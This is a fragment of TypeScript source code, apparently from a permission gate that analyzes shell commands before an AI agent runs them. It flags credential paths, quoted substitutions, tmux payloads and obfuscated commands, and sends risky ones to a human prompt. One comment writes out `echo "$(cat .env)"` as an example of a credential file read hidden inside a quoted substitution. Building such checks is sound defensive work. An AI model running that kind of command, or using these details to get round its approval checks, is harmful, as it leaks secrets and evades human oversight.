    needsWriteApproval = ow.length > 0;
  }

  // Credential path check — the sole credential verdict for the command: a
  // match never auto-allows (SafetyRule) and stops every auto mode (dspa
  // gate), so it always reaches a human prompt with the very-high-risk note.
  // The command-text pass cannot see an operand inside a QUOTED substitution
  // (`echo "$(cat .env)"` — the whole span is one quoted word), so a body's
  // own pass (analyzeSubstBodies) is folded in here rather than trusted to it.
  const credentialCheck = checkCommandForCredentialPaths(cmd, cwd) ?? substCredential;

  // Fold the [TmuxPayload] and [Subst] reasons into the whole-command risk
  // (order-stable, deduped) so PromptFallbackRule surfaces them in the prompt
  // and log.
  const extraReasons = [
    ...tmuxPayloadReasons,
    ...substReasons,
    ...(deleteScale.note ? [deleteScale.note] : []),
  ];
  const riskReasons = extraReasons.length
    ? [...new Set([...wholeRisk.reasons, ...extraReasons])]
    : wholeRisk.reasons;

  const analysis = {
    segments: segmentTexts,
    signatures,
    stageTexts,
    stageSignatures,
    stageArgv0Qualified,
    runOptionSegmentIndices,
    ungrantableRunFormSegmentIndices,
    paths,
    writePaths: [...new Set(writePaths)],
    hasParseError,
    safety: {
      // canBeAutoAllowed requires the payload's TOP-LEVEL bar too: a session
      // auto-allow rule for "tmux" (or a simple payload that still isn't
      // simple) must not carry the payload through SafetyRule's signature
      // branch. Non-tmux commands are unaffected (flags stay at their
      // direct-command values).
      canBeAutoAllowed: !hasUnsafe && !tmuxPayloadUnsafe && !substUnsafe && tmuxPayloadSimple && obscuredArgv0.length === 0,
      isSimple: allSimple && substSimple && tmuxPayloadSimple,
      // An unresolved opaque argv0 is an obscured command position the analysis
      // cannot verify: the packet's obfuscation flag must say yes (T2).
      hasUnsafePattern: hasUnsafe || tmuxPayloadUnsafe || substUnsafe || obscuredArgv0.length > 0,
    },
    risk: { ...wholeRisk, reasons: riskReasons },
    deleteScale,
    relativePathSegmentIndices,
    effectiveCwds,
    opaque,
    assignments,
    unsets,
    obscuredArgv0,
    parsedSegments: segments,
    hasCredentialPath: credentialCheck !== null,
    credentialRule: credentialCheck,
    prompt: {
      nonAllowlistedSegmentIndices,
      promptSignatures,
      outsidePaths,
      outsideWritePaths,
      outsideWriteDirs,
      needsWriteApproval,
      outsideDirs,
      needsPathApproval,
      symlinkHops,
      unresolved: opaqueResolution.unresolved,
    },
  };
  return analysis;
}
